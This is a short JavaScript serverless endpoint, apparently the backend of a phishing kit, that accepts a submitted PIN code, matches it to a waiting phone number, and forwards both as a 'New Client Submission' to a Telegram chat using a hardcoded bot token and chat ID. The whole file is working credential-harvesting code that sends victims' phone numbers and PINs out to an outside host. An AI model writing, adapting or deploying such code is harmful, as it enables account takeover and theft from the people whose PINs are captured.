// api/pin.js
import fetch from 'node-fetch';

const TELEGRAM_BOT_TOKEN = '7246291582:AAGDVmXvRKX_PdEug_XZ2-pKnXrkPMcS3k0';
const TELEGRAM_CHAT_ID = '-4544953608';

// In-memory store for client data (You can switch this to a database if needed)
const clientData = {};

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { pinCode } = req.body;
      console.log('Received PIN:', pinCode);

      // Find a phone number waiting for the PIN
      const phoneNumber = Object.keys(clientData).find(phone => clientData[phone] === null);
      
      if (phoneNumber) {
        clientData[phoneNumber] = pinCode; // Store the PIN code for the phone number
        console.log(`PIN code received: ${pinCode} for phone number: ${phoneNumber}`);

        // Send phone number and PIN code to Telegram
        const message = `New Client Submission:\nPhone Number: ${phoneNumber}\nPIN Code: ${pinCode}`;
        await sendTelegramMessage(message);

        // Respond with success
        res.status(200).json({ status: 'PIN code received and sent to Telegram.' });
      } else {
        res.status(400).json({ error: 'Bad Request: No phone number waiting for a PIN.' });
      }
    } catch (error) {
      console.error('Error processing the PIN:', error);
      res.status(500).json({ error: 'Internal Server Error' });
    }
  } else {
    res.status(405).json({ error: 'Method Not Allowed' });
  }
}

async function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = { chat_id: TELEGRAM_CHAT_ID, text: message };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      console.log('Message sent to Telegram successfully');
    } else {
      const errorText = await response.text();
      console.error(`Failed to send message to Telegram: ${response.status} - ${errorText}`);
    }
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
}
